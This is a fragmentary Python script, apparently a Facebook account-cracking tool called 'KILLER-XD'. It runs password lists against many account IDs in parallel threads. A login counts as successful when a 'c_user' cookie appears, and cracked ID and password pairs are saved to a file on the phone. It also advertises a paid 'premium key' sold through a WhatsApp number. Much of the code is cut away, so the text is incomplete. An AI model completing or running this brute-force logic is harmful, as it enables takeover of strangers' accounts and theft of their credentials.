...
----------------------------------------------
 ...
 Version   : 0.1
----------------------------------------------
 😍 pukhtoon version 0.1
 For fan: inshallah 1 day 😍❤
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+1(423) 405-3055&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi killer Sir, I Need To Buy Your Paid killer PRO Tools Version 1.0. Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def bd():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ...
                                Killer.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                with tred(max_workers=30) as Killer:
                        total = str(len(fo))
                        clear()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [KILLER-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Killer:
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Killer:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Amial-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Amial-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
